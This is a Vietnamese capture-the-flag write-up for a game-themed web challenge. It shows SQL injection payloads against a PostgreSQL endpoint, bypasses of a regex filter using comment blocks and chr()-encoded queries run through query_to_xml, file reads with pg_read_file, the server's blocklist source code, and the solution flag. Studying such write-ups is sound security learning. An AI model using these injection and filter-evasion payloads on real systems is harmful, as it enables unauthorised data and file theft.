<img width="305" height="138" alt="image" src="https://github.com/user-attachments/assets/f509660e-b3fb-4868-b425-91b18dc19a20" />

01

Trang là game Construct2. Bấm thử một lần chết trong game là thấy request:

```bash
T=http://144.79.188.39:47092
curl -s -X POST $T/count -H 'Content-Type: application/json' -d '{"deaths":0}'
```

```json
{"lines":["heya.","you've been busy, huh?","...","do you wanna have a bad time?"],"status":"ok"}
```

Server trả về đoạn thoại của Sans ứng với số lần chết. Một tham số duy nhất, đi thẳng vào DB.

02
Fingerprint DBMS — `1 AND 1` lỗi, và đó KHÔNG phải WAF

| `deaths` | Trả về | Nghĩa |
|---|---|---|
| `0` | 10 dòng thoại | chạy bình thường |
| `1 AND 1` | `{"lines":[],"status":"ok"}` | **LỖI SQL** |
| `1 AND true` | 3 dòng thoại | hợp lệ |

`WHERE refight = 1 AND 1` hỏng vì **PostgreSQL không tự ép `integer → boolean`**:
*"argument of AND must be type boolean, not type integer"*. MySQL/SQLite chấp nhận. ⇒ **PostgreSQL**.


03
Hai tín hiệu phải tách bạch trước khi làm gì

| Phản hồi | Tầng | Nghĩa |
|---|---|---|
| `403 {"status":"blocked"}` | `app.py`, trước DB | WAF regex khớp input |
| `200 {"lines":[],"status":"ok"}` | DB | query lỗi → `rollback()` → vẫn 200 |
| `200 {"lines":[…]}` | DB | chạy được |

Cơ chế: khối `try/except` bắt mọi exception rồi `conn.rollback()` và vẫn `return jsonify(status="ok", lines=[])` — lỗi SQL bị nuốt thành công.

## 04. Đo blacklist bằng probe

| `deaths` | Kết quả | Kết luận |
|---|---|---|
| `0 UNION SELECT version() -- ` | 🔴 `403 blocked` | `union\s+select` khớp |
| `0 UNION/**/SELECT version() -- ` | 🟢 `PostgreSQL 16.15 on x86_64-alpine-linux-musl` | `/**/` né được `\s+` |
| `… current_user -- ` | 🟢 `postgres` | **superuser** |
| `… pg_read_file('/flag.txt') -- ` | 🔴 `403 blocked` | `\bpg_` khớp |
| `… to_regclass('dialogue')::text -- ` | 🟢 `dialogue` | `::text` bắt buộc |

`::text` không phải mẹo làm đẹp: `to_regclass()` trả `regclass`, `query_to_xml()` trả `xml` — UNION với cột `text` sẽ chết với *"UNION types text and regclass cannot be matched"*.

05
Hai mảnh ghép: `/**/` và ` -- `

Regex `union\s+select` đòi **khoảng trắng thật**, thay bằng comment block là xong. Dấu ` -- ` cuối để cắt `ORDER BY seq` còn sót:

```
SELECT line FROM dialogue WHERE refight = 0 UNION/**/SELECT version() --   ORDER BY seq
                                             └── phần chèn ──┘        └─ bị comment ─┘
```

Hệ quả thật khi khai thác: **kết quả mất thứ tự** ⇒ dòng chứa dữ liệu nằm ở vị trí ngẫu nhiên giữa các câu thoại, **không phải `lines[0]`**:

```json
{"lines":["heya.","do you think even the worst person can change...?","...",
"sorry, old lady.","PostgreSQL 16.15 on x86_64-alpine-linux-musl, …",
"welp.","all right."],"status":"ok"}
```

06
Né `\bpg_`: dựng SQL ngay trên server

`pg_` và `information_schema` là chữ cái, không phải khoảng trắng — **không comment nào chen vào giữa được**. Phải để server tự ghép chuỗi, rồi cho `query_to_xml()` thực thi:

| Mảnh | Việc |
|---|---|
| `0` | giá trị giả để `refight = 0` không khớp dòng nào |
| `UNION/**/SELECT` | nối bằng comment block, không có `\s+` |
| `query_to_xml(chr(83)\|\|chr(69)\|\|…, true, false, '')::text` | SQL dựng từng ký tự — HTTP body **không hề chứa `pg_`** |
| ` -- ` | cắt `ORDER BY seq` |

```python
def chain(sql):
    # "SELECT pg_read_file('/flag.txt')" -> "chr(83)||chr(69)||..."
    return "||".join(f"chr({ord(c)})" for c in sql)

def ask(inner_sql):
    payload = ("0 UNION/**/SELECT query_to_xml("
               + chain(inner_sql)
               + ", true, false, chr(39)||chr(39))::text -- ")
    # POST {"deaths": payload}, lọc dòng kết quả khỏi thoại Sans
```

07
Leo thang: superuser + xác nhận blacklist từ source

`current_user` = `postgres` ⇒ `pg_read_file()` đọc được mọi file tiến trình DB đọc được. Đọc luôn source:

```python
BLOCKED = [
    r"union\s+select", r"union\s+all\s+select", r"\bcopy\s",
    r"from\s+program",  r"\bcreate\s+table",    r"\bdrop\s+table",
    r"\bpg_",           r"information_schema",  r"\bsleep\b",  r"\bxp_",
]
...
n = str(body.get("deaths", "0"))
if blocked(n):
    return jsonify(status="blocked"), 403

cur.execute("INSERT INTO deaths (n) VALUES (" + n + ")")
cur.execute("SELECT line FROM dialogue WHERE refight = " + n + " ORDER BY seq")
```

Đúng như dự đoán từ probe. Bảng `dialogue(refight, seq, line)` + `deaths(id, n, ts)` tìm bằng `to_regclass()`.

08
Truy nguồn flag + loại decoy

`/entrypoint.sh`:

```sh
: "${FLAG:=PTITCTF{fake_flag_for_local_testing}}"
: "${GZCTF_FLAG:=$FLAG}"
printf '%s\n' "$GZCTF_FLAG" > /flag.txt
unset FLAG GZCTF_FLAG
```

Flag ghi từ env ra file rồi `unset` ⇒ đọc env sau đó vô ích. Kiểm chéo **ba kênh độc lập**, cả ba khớp nhau:

```
pg_read_file('/flag.txt')
encode(pg_read_binary_file('/flag.txt'),'escape')
pg_read_file('/flag.txt',0,300)
```


---

## Flag

```
PTITCTF{https://youtu.be/0FCvzsVlXpQ?si=always_wondered_why_people_never_use_their_strongest_attack_first_f7e6695bc759}
```
